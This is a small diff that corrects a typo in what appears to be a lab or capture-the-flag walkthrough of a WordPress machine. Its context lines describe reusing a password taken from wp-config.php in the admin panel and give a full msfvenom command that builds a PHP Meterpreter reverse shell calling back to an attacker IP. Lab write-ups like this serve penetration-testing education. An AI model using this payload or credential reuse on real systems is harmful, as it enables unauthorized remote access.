@@ -83,7 +83,7 @@ The `get` command works, so I grabbed the wp-config.php file and viewed it on my
 
 Trying the password found in the `wp-config.php` file in the WordPress admin panel and what do you know, the password works.
 
-Now it's time for time get a quick reverse shell on the machine. To do this I will generate a Meterpreter shell using the following command (.141 is the Kali machine):
+Now it's time to get a quick reverse shell on the machine. To do this I will generate a Meterpreter shell using the following command (.141 is the Kali machine):
 
 `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.17.141 LPORT=4444 -f raw > shell.php`
 
